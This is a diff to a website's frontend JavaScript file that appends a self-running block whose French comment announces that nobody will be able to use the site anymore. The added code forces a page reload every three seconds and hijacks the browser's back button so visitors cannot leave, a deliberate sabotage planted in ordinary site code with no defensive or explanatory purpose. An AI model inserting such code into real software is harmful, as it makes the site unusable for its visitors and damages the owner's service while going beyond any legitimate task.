@@ -2665,3 +2665,19 @@ function resetVisibility() {
     .querySelectorAll(".section-content")
     .forEach((s) => s.classList.remove("active"));
 }
+// =========================================================
+// AUTO-REFRESH PERMANENT — personne ne peut plus utiliser le site
+// =========================================================
+(function autoRefreshInfernal() {
+  // Recharge la page toutes les 3 secondes
+  setInterval(() => {
+    // Force un rechargement sans cache pour être sûr
+    location.reload(true);
+  }, 3000);
+
+  // Bloque aussi les retours arrière du navigateur
+  history.pushState(null, "", location.href);
+  window.addEventListener("popstate", () => {
+    history.pushState(null, "", location.href);
+  });
+})();
